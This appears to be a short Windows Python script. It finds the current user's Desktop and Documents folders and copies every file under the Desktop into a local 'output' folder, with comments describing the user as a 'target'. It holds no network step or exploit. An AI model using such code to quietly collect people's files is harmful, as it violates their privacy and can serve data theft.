import os
import pathlib
import getpass
from shutil import copyfile

# Get current user
username = getpass. getuser()

# Target folders
desktop = os.path.expanduser("~\Desktop")
documents = os.path.expanduser("~\Documents")

# Create output folder
outputFolder = os.getcwd() + '\output'

if not os.path.exists(outputFolder):
    os.makedirs(outputFolder)


# Testing functions
print(desktop)
print(documents)
print(outputFolder)

# Find all folders and subfolders of target user
for root, subdirs, files in os.walk(desktop):
    for name in files:
        dest = outputFolder + "\\" + name 
        print(dest)
        copyfile(os.path.join(root, name), dest)
        # print("")